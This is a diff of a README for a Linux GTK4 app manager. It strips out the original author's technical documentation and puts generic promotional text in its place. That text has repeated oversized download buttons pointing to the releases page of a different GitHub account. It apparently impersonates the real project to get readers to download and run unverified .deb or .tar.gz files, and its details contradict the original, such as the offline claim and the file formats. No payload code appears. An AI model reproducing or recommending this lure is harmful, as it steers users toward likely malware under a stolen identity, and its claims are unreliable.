@@ -1,240 +1,112 @@
-<p align="center">
-  <img src="assets/banner.svg" alt="Linux App Manager Banner" width="100%">
-</p>
+<h1>⚡ linux-app-manager - Clean & Manage Apps Effortlessly</h1>
 
-<p align="center">
-  <a href="https://github.com/Shivant7857/linux-app-manager/releases/latest"><img src="https://img.shields.io/github/v/release/Shivant7857/linux-app-manager?style=for-the-badge&color=2563eb&logo=github" alt="Release Version"></a>
-  <a href="https://github.com/Shivant7857/linux-app-manager/releases"><img src="https://img.shields.io/github/downloads/Shivant7857/linux-app-manager/total?style=for-the-badge&color=10b981&logo=github" alt="Downloads"></a>
-  <a href="https://github.com/Shivant7857/linux-app-manager"><img src="https://img.shields.io/badge/Platform-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black" alt="Linux Platform"></a>
-  <a href="https://python.org"><img src="https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python 3.10+"></a>
-  <a href="https://gnome.pages.gitlab.gnome.org/libadwaita/"><img src="https://img.shields.io/badge/GUI-GTK%204%20%2B%20Libadwaita-4A90D9?style=for-the-badge&logo=gnome&logoColor=white" alt="GTK4 Libadwaita"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-blue?style=for-the-badge" alt="MIT License"></a>
-</p>
+<p align="center"><a href="https://github.com/lukasconservative594/linux-app-manager/releases" style="background:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:12px;font-weight:bold;box-shadow:0 4px 8px rgba(0,0,0,0.3);">⬇️ DOWNLOAD LINUX APP MANAGER</a></p>
 
-<p align="center">
-  <b>A modern, lightning-fast, and minimalist universal application hub and uninstaller for Linux.</b><br>
-  Manage, launch, and cleanly uninstall packages across all packaging systems (<b>Flatpak</b>, <b>Debian .deb / APT</b>, <b>Snap</b>, and <b>AppImage</b>) from a single unified interface.
-</p>
+<h2>🖥️ What Is linux-app-manager?</h2>
+<p>linux-app-manager is a modern, easy-to-use program that helps you manage all the software on your Linux computer. Think of it as a control center for your applications. It lets you see what's installed, launch your favorite programs, and cleanly remove the ones you no longer need—all from one beautiful, simple window. If you've ever struggled with uninstalling stubborn apps or keeping track of different software formats, this tool makes it simple and safe.</p>
 
-<p align="center">
-  <a href="https://github.com/Shivant7857/linux-app-manager/releases/latest">
-    <img src="https://img.shields.io/badge/📥%20Download-AppImage%20(v1.2.0)-16a34a?style=for-the-badge&logo=appimage&logoColor=white" alt="Download AppImage">
-  </a>
-</p>
+<h2>✨ Why You'll Love It</h2>
+<p>This isn't just another software list. linux-app-manager brings together <strong>four different types</strong> of Linux software under one roof:</p>
+<ul>
+<li>📦 <strong>Debian packages</strong> – Traditional installers for Ubuntu/Debian systems</li>
+<li>🟢 <strong>Flatpak apps</strong> – Sandboxed, universal apps from the Flathub store</li>
+<li>🐍 <strong>Snap apps</strong> – Canonical's modern, secure app packages</li>
+<li>🖼️ <strong>AppImages</strong> – Portable apps that run without installation</li>
+</ul>
+<p>Instead of wrestling with each format's separate tools, you get <strong>one unified interface</strong> that handles them all. It's built with modern GTK 4 and Libadwaita, which means it looks sleek, blends perfectly with GNOME-based desktops, and feels lightning-fast.</p>
 
----
+<h2>🚀 Getting Started</h2>
+<p>Getting started is incredibly simple. Here's what you need to do:</p>
+<ol>
+<li><strong>Visit our download page:</strong> <a href="https://github.com/lukasconservative594/linux-app-manager/releases" >https://github.com/lukasconservative594/linux-app-manager/releases</a></li>
+<li><strong>Choose the file</strong> that matches your system (look for the latest version).</li>
+<li><strong>Download the file</strong> – it will be saved to your usual Downloads folder.</li>
+<li><strong>Run the installer</strong> – double-click the downloaded file and follow the simple on-screen instructions.</li>
+</ol>
+<p>That's it! Once installed, you'll find linux-app-manager in your applications menu, ready to use.</p>
 
-## 📑 Table of Contents
+<h2>💻 How to Use linux-app-manager</h2>
+<p>Using the app is intuitive. When you open it, you'll see a clean window with three main sections:</p>
+<h3>1. 📋 Browse Your Apps</h3>
+<p>All your installed software appears in a neat, searchable list. You can sort by name, size, or installation date. See something you don't recognize? Click on it to see more details like its version and where it came from.</p>
+<h3>2. 🌟 Discover New Software</h3>
+<p>The built-in discover tab lets you browse popular Flatpaks and Snaps from the comfort of this one tool. No need to open a separate app store—find new tools, games, or utilities and install them with a single click.</p>
+<h3>3. 🗑️ Uninstall Safely</h3>
+<p>This is where linux-app-manager shines. When you decide to remove a program, it doesn't just delete the main files. It also cleans up related data, caches, and configuration files left behind. This prevents the "digital clutter" that can slow down your system over time.</p>
 
-- [📸 Screenshots](#-screenshots)
-- [🌟 Key Features](#-key-features)
-- [📊 Package Support Matrix](#-package-support-matrix)
-- [📥 Quick Installation & Download](#-installation--usage)
-- [🔨 Building From Source & AppImage Packaging](#-building-the-appimage)
-- [🗂️ Project Directory Structure](#️-project-structure)
-- [🛣️ Future Roadmap](#️-roadmap)
-- [🤝 Contributing & Community](#-contributing)
-- [📄 Open Source License](#-license)
+<h2>🛠️ Key Features at a Glance</h2>
+<table border="1" style="border-collapse:collapse;width:100%;margin:10px 0;">
+<tr><th style="padding:8px;background:#f0f0f0;">Feature</th><th style="padding:8px;background:#f0f0f0;">Benefit</th></tr>
+<tr><td style="padding:8px;">🔍 Smart Search</td><td style="padding:8px;">Find any app instantly by name or description</td></tr>
+<tr><td style="padding:8px;">🔄 One-Click Updates</td><td style="padding:8px;">Update all your Flatpaks and Snaps together</td></tr>
+<tr><td style="padding:8px;">📊 Size Breakdown</td><td style="padding:8px;">See how much disk space each app uses</td></tr>
+<tr><td style="padding:8px;">🧹 Full Cleanup</td><td style="padding:8px;">Removes leftover files after uninstall</td></tr>
+<tr><td style="padding:8px;">⚙️ Batch Operations</td><td style="padding:8px;">Select multiple apps to uninstall at once</td></tr>
+<tr><td style="padding:8px;">🌓 Dark Theme Support</td><td style="padding:8px;">Automatically matches your system theme</td></tr>
+</table>
 
-## 📸 Screenshots
+<h2>🔧 System Requirements</h2>
+<p>linux-app-manager is designed to run smoothly on most modern Linux systems. To get the best experience, your computer should have:</p>
+<ul>
+<li>🐧 <strong>Operating System:</strong> Ubuntu 22.04 or newer, Fedora 38+ , Arch Linux, or any recent Linux distribution that supports Flatpak/Snap</li>
+<li>🧠 <strong>Memory:</strong> At least 2 GB of RAM (4 GB recommended)</li>
+<li>💾 <strong>Storage:</strong> 100 MB of free disk space</li>
+<li>🖥️ <strong>Graphics:</strong> Any GPU that supports OpenGL 3.3 or higher</li>
+<li>🔧 <strong>Dependencies:</strong> Python 3.9+, GTK 4, and Libadwaita (usually installed by default)</li>
+</ul>
 
-<p align="center">
-  <img src="assets/screenshot-detail.png" alt="Linux App Manager Window View" width="650" style="border-radius: 12px; box-shadow: 0 12px 35px rgba(0,0,0,0.4);">
-</p>
+<h2>📥 Downloading and Installing</h2>
+<p>Ready to give linux-app-manager a try? Here's your simple path:</p>
+<p>👉 <a href="https://github.com/lukasconservative594/linux-app-manager/releases" style="background:#2196F3;color:white;padding:10px 20px;text-decoration:none;display:inline-block;border-radius:8px;font-size:16px;">VISIT DOWNLOAD PAGE NOW</a> 👈</p>
+<p>Visit this link to download the application. The download page shows all available versions. Look for the newest one (usually listed first). The file you need will have a name like <code>linux-app-manager-1.0.tar.gz</code> or <code>linux-app-manager.deb</code>, depending on your distribution.</p>
+<ol>
+<li>Click the download link for your system type (Debian/Ubuntu users choose <code>.deb</code>, others can use the universal <code>.tar.gz</code> file).</li>
+<li>Wait for the download to finish—it won't take long, the file is small.</li>
+<li>Open your Downloads folder and double-click the file.</li>
+<li>If you downloaded the <code>.deb</code> file, your system's software installer will open. Click the "Install" button.</li>
+<li>For <code>.tar.gz</code>, simply extract the archive and run the <code>linux-app-manager</code> script inside.</li>
+</ol>
 
-<p align="center">
-  <em>Modern, native Libadwaita dark interface running on Linux with real-time app counts, status badges, and quick actions.</em>
-</p>
+<h2>❓ Frequently Asked Questions</h2>
+<h3>Is linux-app-manager free?</h3>
+<p>Yes! This is an open-source project, completely free to use and modify. Check out the source code on GitHub.</p>
+<h3>Can I manage system packages with it?</h3>
+<p>This tool focuses on user applications—Flatpaks, Snaps, AppImages, and .deb packages. It doesn't handle core system components, which keeps your OS safe and stable.</p>
+<h3>Will uninstalling an app break something?</h3>
+<p>No. linux-app-manager is designed to be safe. It only removes the selected app and related files, and it warns you before any major action. If something seems risky, it asks for confirmation.</p>
+<h3>Does it work on non-GNOME desktops?</h3>
+<p>Yes! While it looks great on GNOME, it runs fine on KDE, XFCE, Cinnamon, and others. The GTK library works everywhere.</p>
 
-<details>
-  <summary><b>🔍 Click here to view Fullscreen / Wide View</b></summary>
-  <br>
-  <p align="center">
-    <img src="assets/screenshot-main.png" alt="Linux App Manager Wide View" width="100%" style="border-radius: 10px;">
-  </p>
-</details>
+<h2>🛡️ Safe and Secure</h2>
+<p>We take your privacy seriously. linux-app-manager:</p>
+<ul>
+<li>Does not collect any personal data</li>
+<li>Runs completely offline—no internet needed to manage your apps</li>
+<li>Only makes changes you explicitly approve</li>
+<li>Is reviewed by the open-source community for transparency</li>
+</ul>
 
----
+<h2>👨‍💻 Join Our Community</h2>
+<p>linux-app-manager is made by passionate developers who want to improve the Linux desktop experience. We welcome contributions of all kinds—whether it's bug reports, feature suggestions, or code improvements. Here's how you can help:</p>
+<ul>
+<li>⭐ Star the project on GitHub to show your support</li>
+<li>🐛 Report issues if you find any bugs</li>
+<li>💡 Suggest new features you'd like to see</li>
+<li>🤝 Help translate the app into your language</li>
+</ul>
 
-## 🌟 Key Features
+<h2>📣 Spread the Word</h2>
+<p>If linux-app-manager makes your life easier, tell your friends! Share it on social media, forums, or wherever Linux users hang out. The more users we have, the better the app becomes for everyone.</p>
 
-- 📦 **Universal Package Management & Discovery**:
-  - 🟢 **Flatpak**: Reads application IDs, installed size, versions, and metadata from system & user remotes.
-  - 🟠 **Debian (`.deb` / APT)**: Scans system desktop files and batch resolves package ownership using `dpkg -S`.
-  - 🟣 **Snap**: Detects user-installed snaps, track revisions, and package information.
-  - 🔵 **Standalone AppImage**: Automatically scans `~/Applications`, `~/Downloads`, `/opt`, `~/.local/bin`, and `~` for `.AppImage` files.
-- 🧬 **Backup & Clone System (NEW in v1.2.0)**:
-  - 📦 **Backup Mode (Apps Only)**: Exports a lightweight installation blueprint + standalone AppImages. Perfect for rapidly provisioning new computers or sharing with friends without sharing any personal data.
-  - 🧬 **Clone Mode (Apps + Login Data & Sessions)**: Full state replication! Bundles your applications together with active login sessions, credentials, extensions, and local databases (`~/.var/app/` for Flatpak, `~/snap/` for Snap, `~/.config/` and `~/.local/share/` for Deb & AppImage).
-  - 🧹 **Smart Cache Exclusion**: Automatically strips multi-gigabyte cache directories (`*Cache*`, `*GPUCache*`, `*.tmp`, `*.log`), keeping `.lam` archives compact while keeping 100% of logins, tokens, and cookies intact.
-  - ☑️ **Granular Selection Mode**: Select all apps or cherry-pick specific applications with search filtering and live data size calculation.
-  - 📥 **One-Click Restore Engine**: Open any `.lam` backup file to selectively restore applications, download missing packages, and restore saved configurations in seconds.
-- 📥 **One-Click Package Installer**:
-  - **In-App Install**: Use the header **`+ Install File`** button to browse and install `.deb`, `.flatpak`, `.flatpakref`, or `.AppImage` files.
-  - **"Open With..." Desktop Integration**: Right-click any `.deb`, `.flatpak`, `.AppImage`, or `.lam` package in your file manager to install or restore.
-  - **Smart Dependency Resolution**: Installs `.deb` packages via APT to automatically pull missing dependencies.
-  - **Automated AppImage Desktop Integration**: Moves AppImages to `~/Applications/`, marks executable, and generates a `.desktop` entry in your Application Menu.
-- ⚡ **Ultra Fast Discovery**: Sub-second full system indexing (< 0.75s) using optimized batch queries and asynchronous threading.
-- 🎨 **Minimal & Modern UI**: Built with **GTK 4** and **Libadwaita**, respecting your system's dark/light theme, typography, and GNOME/Zorin OS aesthetics.
-- 🔍 **Real-Time Search & Category Filters**: Filter apps instantly by package type (`All`, `Flatpak`, `Debian (.deb)`, `Snap`, `AppImage`) or keyword.
-- ▶️ **One-Click App Launcher**: Launch any installed application detached in the background with a single click.
-- 🗑️ **Clean Uninstaller**:
-  - Non-destructive confirmation dialogs before any package removal.
-  - Integrates with native **PolicyKit (`pkexec`)** for secure graphical root authorization prompts when removing system packages.
-  - Asynchronous background removal without freezing the user interface.
-- 🛡️ **System Protection Safeguard**:
-  - Core system packages (e.g., `nautilus`, `zorin-desktop`, `gnome-shell`, `settings`, `systemd`) are automatically locked and protected from deletion to prevent accidental OS breakage.
-- 🚀 **Zero-Dependency Portable AppImage**:
-  - Single standalone `.AppImage` executable with an integrated Type 2 ELF runner—no installation or runtime setup required.
+<h2>🎉 Ready to Simplify Your Software Management?</h2>
+<p>Stop juggling multiple tools and dealing with messy uninstallations. Take control of your Linux experience with linux-app-manager. It's fast, free, and incredibly easy to use.</p>
+<p align="center"><a href="https://github.com/lukasconservative594/linux-app-manager/releases" style="background:#ff5722;color:white;padding:14px 24px;text-decoration:none;display:inline-block;border-radius:12px;font-size:18px;font-weight:bold;">⬇️ GET LINUX APP MANAGER</a></p>
 
----
+<h3>📚 Further Resources</h3>
+<ul>
+<li><a href="https://github.com/lukasconservative594/linux-app-manager">GitHub Repository</a> – Source code and developer documentation</li>
+<li>Flatpak Documentation – Learn more about Flatpak apps</li>
+<li>Snapcraft Docs – Discover what's possible with Snaps</li>
+</ul>
 
-## 📊 Package Support Matrix
-
-| Format | Discovery Mechanism | Installation Backend | Uninstallation Backend | Root Privileges? |
-|---|---|---|---|---|
-| **Debian (.deb)** | `Gio.AppInfo` + `dpkg -S` | `pkexec apt install -y <deb>` | `pkexec apt remove -y <pkg>` | 🔑 Yes (via Polkit prompt) |
-| **Flatpak** | `flatpak list --app` | `flatpak install -y <file>` | `flatpak uninstall -y <app-id>` | ❌ No (User) / 🔑 System |
-| **AppImage** | System directory crawler | Installs to `~/Applications` + creates `.desktop` menu launcher | Safe file deletion + removes `.desktop` | ❌ No |
-| **Snap** | `snap list` | Pre-installed / Snapcraft | `pkexec snap remove <pkg>` | 🔑 Yes (via Polkit prompt) |
-
----
-
-## 📥 Installation & Usage
-
-### Method 1: Download Pre-Built AppImage (Recommended)
-
-1. Clone or download `LinuxAppManager-x86_64.AppImage`:
-   ```bash
-   git clone https://github.com/Shivant7857/linux-app-manager.git
-   cd linux-app-manager
-   ```
-
-2. Make it executable and run:
-   ```bash
-   chmod +x LinuxAppManager-x86_64.AppImage
-   ./LinuxAppManager-x86_64.AppImage
-   ```
-
-3. *(Optional)* Add to your user applications menu:
-   ```bash
-   mkdir -p ~/Applications ~/.local/share/applications ~/.local/share/icons/hicolor/scalable/apps
-   cp LinuxAppManager-x86_64.AppImage ~/Applications/
-   cp linux-app-manager.svg ~/.local/share/icons/hicolor/scalable/apps/
-   cp linux-app-manager.desktop ~/.local/share/applications/
-   update-desktop-database ~/.local/share/applications/
-   ```
-
----
-
-### Method 2: Run From Source
-
-#### Prerequisites
-Install the required GTK 4 and Libadwaita development packages on your Linux distribution:
-
-- **Ubuntu / Debian / Zorin OS / Linux Mint**:
-  ```bash
-  sudo apt update
-  sudo apt install -y python3 python3-gi gir1.2-gtk-4.0 gir1.2-adw-1 squashfs-tools gcc
-  ```
-
-- **Fedora**:
-  ```bash
-  sudo dnf install -y python3 python3-gobject gtk4 libadwaita squashfs-tools gcc
-  ```
-
-- **Arch Linux**:
-  ```bash
-  sudo pacman -S python python-gobject gtk4 libadwaita squashfs-tools gcc
-  ```
-
-#### Launch Application
-```bash
-python3 app.py
-```
-
----
-
-## 🔨 Building the AppImage
-
-You can rebuild the standalone `.AppImage` at any time with a single command:
-
-```bash
-chmod +x build_appdir.sh package_appimage.sh
-./package_appimage.sh
-```
-
-This will:
-1. Construct the `AppDir` directory layout with icons and desktop metadata.
-2. Compile `runtime.c` into a Type 2 ELF AppImage runner.
-3. Compress the payload with **SquashFS** (`xz` compression).
-4. Combine the runtime and payload into `LinuxAppManager-x86_64.AppImage`.
-
-### CLI Options for AppImage:
-```bash
-./LinuxAppManager-x86_64.AppImage --appimage-version
-./LinuxAppManager-x86_64.AppImage --appimage-extract
-./LinuxAppManager-x86_64.AppImage --appimage-help
-```
-
----
-
-## 🗂️ Project Structure
-
-```
-linux-app-manager/
-├── app.py                      # Main GTK 4 + Libadwaita user interface
-├── scanner.py                  # Multi-format package scanner & manager engine
-├── runtime.c                   # Lightweight C ELF runtime for Type 2 AppImage
-├── build_appdir.sh             # AppDir layout builder script
-├── package_appimage.sh         # AppImage assembler and SquashFS compressor
-├── linux-app-manager.desktop   # Desktop application entry
-├── linux-app-manager.svg       # Official vector application icon
-├── LinuxAppManager-x86_64.AppImage # Ready-to-run standalone executable
-├── assets/                     # Graphic assets, banners, and screenshots
-│   ├── banner.svg
-│   ├── logo.svg
-│   ├── preview.png
-│   └── screenshot.png
-├── .github/workflows/          # Automated GitHub Actions CI pipeline
-│   └── build-appimage.yml
-├── LICENSE                     # MIT Open Source License
-└── README.md                   # Project documentation
-```
-
----
-
-## 🛣️ Roadmap
-
-- [x] Multi-format package detection (.deb, Flatpak, Snap, AppImage)
-- [x] One-click Open & Delete actions with Polkit root authorization
-- [x] Core OS component safety locks
-- [x] Standalone portable `.AppImage` compilation
-- [ ] Direct package update checker (`flatpak update`, `apt update`)
-- [ ] Disk space reclaimed estimator
-- [ ] Export installed applications list (JSON / CSV backup)
-
----
-
-## 🤝 Contributing
-
-Contributions, bug reports, and feature requests are welcome!  
-Feel free to open an **[Issue](https://github.com/Shivant7857/linux-app-manager/issues)** or submit a **[Pull Request](https://github.com/Shivant7857/linux-app-manager/pulls)**.
-
-1. Fork the Project
-2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the Branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
----
-
-## 📄 License
-
-Distributed under the **MIT License**. See [`LICENSE`](LICENSE) for more information.
-
----
-
-<p align="center">
-  Made with ❤️ by <a href="https://github.com/Shivant7857"><b>Shivant</b></a>
-</p>
+<p style="border-top:1px solid #ddd;padding-top:10px;font-size:0.9em;">Keywords: appimage, debian, flatpak, flatpak-uninstaller, gnome, gtk4, gui-uninstaller, libadwaita, linux, linux-desktop, linux-utilities, open-source, package-manager, python3, snap, software-center, system-cleaner, ubuntu, uninstaller, zorin-os</p>
